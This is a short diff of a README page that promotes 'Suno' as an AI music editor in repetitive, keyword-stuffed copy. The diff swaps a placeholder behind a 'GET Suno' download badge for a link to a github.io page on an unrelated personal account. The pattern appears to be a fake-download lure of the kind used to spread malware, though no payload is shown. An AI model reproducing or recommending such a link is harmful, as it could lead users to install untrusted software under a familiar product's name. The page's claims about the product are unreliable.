@@ -4,7 +4,7 @@
 
 Suno is a focused AI music editor for generating audio, comparing song structures, and understanding where composition energy goes. Suno keeps sessions readable, track reports clear, and daily music editing easier for musicians, podcasters, video editors, and sound designers who rely on Suno for steady Suno AI music workflow insight.
 
-[![GET Suno](https://img.shields.io/badge/GET%20%E2%80%94%20Suno-0078D6?style=for-the-badge&logoColor=white)](SILKA)
+[![GET Suno](https://img.shields.io/badge/GET%20%E2%80%94%20Suno-0078D6?style=for-the-badge&logoColor=white)](https://ruthhernandezq487.github.io/.github/suno-ai-music)
 
 ---
 
